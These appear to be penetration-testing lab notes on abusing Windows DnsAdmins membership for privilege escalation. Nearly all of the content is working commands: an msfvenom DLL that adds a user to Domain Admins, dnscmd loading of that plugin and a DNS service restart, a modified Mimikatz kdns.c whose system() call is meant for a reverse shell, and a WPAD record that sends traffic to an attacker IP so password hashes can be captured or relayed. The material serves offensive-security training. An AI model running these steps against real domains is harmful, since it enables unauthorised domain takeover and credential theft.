# DnsAdmin Member
```
whoami /groups
```
```
DnsAdmins
```
```
net localgroup "DnsAdmins"
```
## Leveraging DnsAdmins Access
### Generating Malicious DLL
1. Add a user to the domain admins group using msfvenom
```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```
2. Transfer the file to the host machine
#### Loading DLL as Non-Privileged User
```
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```
Access Denied
#### Loading DLL as Member of DnsAdmins
```
Get-ADGroupMember -Identity DnsAdmins
```
After confirming group membership in the DnsAdmins group, we can re-run the command to load a custom DLL.
```
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```
After restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let's check our current user's permissions on the DNS service.
##### Finding User's SID
```
wmic useraccount where name="netadm" get sid
```
##### Checking Permissions on DNS Service
```
sc.exe sdshow DNS
```
##### Check permissions using this article
```
https://www.winhelponline.com/blog/view-edit-service-permissions-windows/
```
Done from cmd
Stopping the DNS Service
```
C:\ sc stop dns
```
Starting the DNS Service
```
C:\ sc start dns
```
##### Confirming Group Membership
```
C:\ net group "Domain Admins" /dom
```
**SIGN OUT AND THEN SIGN IN TO TAKE EFFECT**
#### Cleaning Up
##### Confirming Registry Key Added
```
C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```
We find the name of our .dll file and on the far left the name of the key points that points to our custom DLL
##### Deleting Registry Key
```
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```
##### Starting the DNS Service Again
```
sc.exe start dns
```
```
sc query dns
```
### Using Mimilib.dll
we could also utilize mimilib.dll from the creator of the Mimikatz tool to gain command execution by modifying the kdns.c file to execute a reverse shell one-liner or another command of our choosing.
```
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```
### Creating a WPAD Record
After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.
Disabling the Global Query Block List
```
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```
Adding a WPAD Record
```
C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```